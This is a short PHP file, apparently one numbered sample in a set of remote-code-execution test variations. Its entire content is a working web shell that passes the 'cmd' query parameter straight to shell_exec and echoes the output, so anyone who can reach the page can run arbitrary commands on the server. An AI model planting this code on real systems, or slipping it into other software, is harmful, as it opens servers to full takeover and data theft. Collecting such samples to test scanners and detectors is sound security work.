<?php
// RCE test variation #148
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>